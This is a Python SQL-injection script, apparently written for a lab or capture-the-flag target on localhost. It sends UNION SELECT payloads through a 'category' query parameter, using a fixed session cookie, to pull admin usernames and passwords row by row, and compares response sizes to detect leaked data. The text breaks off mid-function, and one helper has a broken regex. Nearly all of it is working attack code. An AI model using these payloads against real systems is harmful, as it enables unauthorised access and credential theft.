import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

def get_response_size(payload):
    """Get response size for a payload"""
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    return len(r.text), r.text

print("="*80)
print("PRECISE CREDENTIAL EXTRACTION")
print("="*80)

# Step 1: Establish baseline with normal category
print("\n[+] Step 1: Baseline response")
norm_size, norm_text = get_response_size("Nature")
print(f"Normal 'Nature' query: {norm_size} bytes")

# Step 2: Extract actual credentials using UNION
print("\n[+] Step 2: Extracting credentials from admins table")

# Test different row offsets
for row in range(3):
    print(f"\n[+] Trying row {row}:")
    
    # Extract username
    payload_user = f"Nature' UNION SELECT username FROM admins LIMIT {row},1#"
    user_size, user_text = get_response_size(payload_user)
    
    # Extract password  
    payload_pass = f"Nature' UNION SELECT password FROM admins LIMIT {row},1#"
    pass_size, pass_text = get_response_size(payload_pass)
    
    print(f"Username query: {user_size} bytes")
    print(f"Password query: {pass_size} bytes")
    print(f"Normal query: {norm_size} bytes")
    
    # If sizes differ, data was extracted
    if user_size != norm_size or pass_size != norm_size:
        print(f"[!] Size difference detected - data extracted!")
        
        # Find differences in HTML by comparing character by character
        print(f"\n[!] Analyzing response differences...")
        
        # Look for the actual data by extracting text between HTML tags
        def extract_text_between_tags(html, tag):
            pattern = f'[^<]*'
            matches = re.findall(pattern, html)
            # Filter out empty strings and common content
            filtered = [m.strip() for m in matches if m.strip() and len(m.strip()) > 2]
            return filtered
        
        # Extract potential values from response
        def get_potential_values(html):
            # Find all text content
            text_content = re.findall(r'>\s*([^<]{3,50})\s*<', html)
            values = []
            for text in text_content:
